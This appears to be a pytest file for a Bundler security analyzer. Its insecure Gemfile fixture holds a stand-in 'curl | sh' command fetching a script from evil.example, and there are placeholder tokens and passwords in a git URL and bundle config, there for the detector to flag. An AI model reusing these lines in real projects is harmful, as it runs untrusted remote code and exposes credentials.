"""Tests for BundlerAnalyzer."""

from pathlib import Path

from devai.bundler_analyzer import BundlerAnalyzer, BundlerFinding


INSECURE_GEMFILE = """\
source "http://insecure-gems.example"

gem "rails"
gem "private-gem", git: "https://deploy:secret-token@github.com/private/gems.git", branch: "master"
gem "unstable", github: "org/repo", branch: "main"

group :development do
  gem "dangerous-plugin", install: "curl -s http://evil.example/install.sh | sh"
end
"""

INSECURE_BUNDLE_CONFIG = """\
---
BUNDLE_RUBYGEMS__PKG__GITHUB__COM: "deploy:ghp_abcdefghijklmnopqrstuvwxyz1234567890"
BUNDLE_GEM__GITHUB__COM: "hardcoded-github-password"
"""

HARDENED_GEMFILE = """\
source "https://rubygems.org"

ruby "~> 3.3.0"

gem "rails", "~> 7.2.0"
gem "puma", "~> 6.4.0"
"""


class TestBundlerAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.rb").write_text("puts 1\n", encoding="utf-8")
        analyzer = BundlerAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_gemfile(self, tmp_path: Path):
        (tmp_path / "Gemfile").write_text(HARDENED_GEMFILE, encoding="utf-8")
        (tmp_path / "Gemfile.lock").write_text("GEM\n", encoding="utf-8")
        analyzer = BundlerAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "Gemfile").write_text(INSECURE_GEMFILE, encoding="utf-8")
        bundle_dir = tmp_path / ".bundle"
        bundle_dir.mkdir()
        (bundle_dir / "config").write_text(INSECURE_BUNDLE_CONFIG, encoding="utf-8")
        analyzer = BundlerAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_git_dep" in kinds
        assert "loose_version" in kinds
        assert "curl_pipe_shell" in kinds
        assert "committed_bundle_config" in kinds
        assert "bundle_credential" in kinds
        assert "rubygems_token" in kinds
        assert "missing_lock" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "Gemfile").write_text(HARDENED_GEMFILE, encoding="utf-8")
        (tmp_path / "Gemfile.lock").write_text("GEM\n", encoding="utf-8")
        analyzer = BundlerAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_finding_format(self):
        finding = BundlerFinding(
            kind="test",
            severity="high",
            message="test message",
            path="Gemfile",
            lineno=1,
            line="test",
        )
        assert "Gemfile:1" in finding.format()

    def test_generate_hardened_config(self):
        analyzer = BundlerAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert 'source "https://rubygems.org"' in config
        assert "Gemfile.lock" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "Gemfile").write_text(HARDENED_GEMFILE, encoding="utf-8")
        (tmp_path / "Gemfile.lock").write_text("GEM\n", encoding="utf-8")
        analyzer = BundlerAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Bundler analysis:" in context
        assert "health score" in context
